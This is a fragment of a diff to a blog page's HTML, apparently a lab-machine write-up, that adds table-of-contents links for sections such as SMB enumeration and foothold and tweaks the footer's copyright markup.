+      <li class="nav-item nav-level-1"> <a class="nav-link" href="#methodology"> <span class="nav-number">1</span> <span class="nav-text">Methodology</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#lessons-learned"> <span class="nav-number">2</span> <span class="nav-text">Lessons Learned</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#open-ports-enumeration"> <span class="nav-number">3</span> <span class="nav-text">Open Ports Enumeration</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#smb-service-enumeration"> <span class="nav-number">4</span> <span class="nav-text">SMB Service Enumeration</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#foothold"> <span class="nav-number">5</span> <span class="nav-text">Foothold</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#system-owned"> <span class="nav-number">6</span> <span class="nav-text">System Owned</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#resources"> <span class="nav-number">7</span> <span class="nav-text">Resources</span> </a> </li>
     </ol>
   </div>
             
@@ -941,10 +987,10 @@ root@lame:/#
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">
+        <div class="copyright" >
   
   
-  © 
+  &copy; 
   <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
